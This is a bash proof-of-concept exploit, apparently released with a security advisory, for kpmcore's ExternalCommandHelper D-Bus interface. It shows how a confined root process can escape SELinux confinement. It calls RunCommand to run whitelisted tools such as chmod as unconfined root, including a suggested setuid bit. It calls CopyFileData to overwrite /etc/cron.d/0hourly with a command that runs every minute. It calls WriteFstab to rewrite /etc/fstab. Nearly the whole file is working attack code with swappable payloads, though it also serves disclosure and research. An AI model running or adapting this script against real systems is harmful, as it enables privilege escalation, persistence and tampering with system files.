#!/bin/bash
#
# LinnemanLabs - kpmcore ExternalCommand PoC
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# kpmcore's ExternalCommandHelper runs whitelisted storage tools as unconfined
# root, gated only by polkit.
#
# This PoC can write a cron entry, fstab entry, and set chmod +s on /bin/true 
#
# gate: org.kde.kpmcore.externalcommand.init (auth_admin_keep), self-passed by uid-0
# reach: any uid-0 daemon that can send to the kpmcore D-Bus name
#
# raw busctl and python, no client to build. run from a confined uid-0 foothold.
#
SVC="org.kde.kpmcore.helperinterface /Helper org.kde.kpmcore.externalcommand"
# a writable dir the confined domain can reach: /var/lib/bluetooth, /run/, etc.
STATE="${STATE:-/var/lib/bluetooth}"

# RunCommand(command, args[], stdin, channelMode) - sig sasayi
#    runs a whitelisted tool (~88 storage tools: chown, chmod, lsblk, mount, dmsetup, lvm,
#    cryptsetup, sfdisk...) as unconfined root. Command must be absolute path. Output is
#    returned in the reply. For the full list of approved commands see:
#    https://github.com/KDE/kpmcore/blob/master/src/util/externalcommand_whitelist.h
#
# absolute path to whitelisted binary "/usr/bin/chmod"
CMD="${CMD:-/usr/bin/lsblk}"
# space-separated "04755 /var/lib/bluetooth/suid_bin"
ARGS="${ARGS:-}"
echo "[*] RunCommand: running ${CMD} ${ARGS}"
read -ra ARGV <<<"$ARGS"
REPLY=$( busctl --system -- call ${SVC} RunCommand sasayi "$CMD" ${#ARGV[@]} "${ARGV[@]}" 0 0 2>/dev/null )
EC=$(grep -oP '"exitCode" i \K-?\d+' <<<"$REPLY")
if [ "$EC" = 0 ]; then
  echo "[+] $CMD ${ARGV[*]} ran (unconfined):"
  # kind of a mess to do some dbus in shellscript but it generally works
  grep -oP '"output" ay \d+ \K[\d ]+' <<<"$REPLY" | awk '{for(i=1;i<=NF;i++)printf "%c",$i}' | sed 's/^/    /'
else
  echo "[-] failed - not whitelisted, bad path prefix, or nonzero exit"
fi
echo ""

# CopyFileData(src, srcOff, srcLen, tgt, tgtOff, chunkSize) - sig sxxsxx
#    truncates and writes src at tgtOff. cleanest mode is overwrite using offset 0.
#    not an append: it opens the target O_TRUNC and writes src at tgtOff, so any
#
#    kpmcore refuses to create a new file it will only overwrite, so rewrite the
#    stock /etc/cron.d/0hourly and our cmd execs every minute. PoC retains the stock
#    Fedora 0hourly, replace STOCK with your distros if it's different.
CRONFILE=/etc/cron.d/0hourly
CRONCMD="{ id; grep ^Cap /proc/self/status; } > /tmp/kpm.out"
STOCK=$'# Run the hourly jobs\nSHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\n01 * * * * root run-parts /etc/cron.hourly\n'
echo "[*] CopyFileData: staging $STATE/0hourly.new"
printf "%s* * * * * root ${CRONCMD}\n" "$STOCK" > "$STATE/0hourly.new"
[[ -s "$STATE/0hourly.new" ]] || { echo "$STATE/0hourly.new does not exist, bailing early"; exit 1; }
LN=$(stat -c%s "$STATE/0hourly.new")
echo "[*] CopyFileData: rewrite $CRONFILE"
if busctl --system call ${SVC} CopyFileData sxxsxx "$STATE/0hourly.new" 0 $LN "$CRONFILE" 0 $LN 2>/dev/null | grep -q '"success" b true'; then
  echo "[+] done - cmd should exec within 60s. check /tmp/kpm.out if using default cmd"
  echo "[*] to cleanup: remove the cmd from /etc/cron.d/0hourly"
else
  echo "[-] CopyFileData failed - not reachable?"
fi
echo ""

# WriteFstab(bytes) - sig ay
#    truncate and writes arbitrary bytes to /etc/fstab. this PoC reads the real
#    fstab (needs read on etc_t - common), appends our line, writes it all back.
FSTAB="${FSTAB:-# kpmcore-poc was here (remove me)}"
echo "[*] WriteFstab: adding line to /etc/fstab"
echo "[*]     backup: $STATE/fstab.bak"
cp /etc/fstab "$STATE/fstab.bak" || { echo "[-] failed to take fstab backup. we would overwrite without preserving existing contents. exiting"; exit 1; }
cp /etc/fstab "$STATE/fstab.new"
printf "$FSTAB\n" >> "$STATE/fstab.new"
# python for the byte array - a mistake here means fstab gets corrupted
FSTAB_NEW="$STATE/fstab.new" python3 - <<'PY'
import dbus, os
data = open(os.environ['FSTAB_NEW'], 'rb').read()
# introspect=False skips the Introspect call (SELinux denies it; the method still works)
obj = dbus.SystemBus().get_object('org.kde.kpmcore.helperinterface', '/Helper', introspect=False)
h = dbus.Interface(obj, 'org.kde.kpmcore.externalcommand')
print('[+] WriteFstab: dbus return:', h.WriteFstab(dbus.ByteArray(data)))
PY

echo "[*] to cleanup: remove the line from /etc/fstab or restore backup"

exit 0
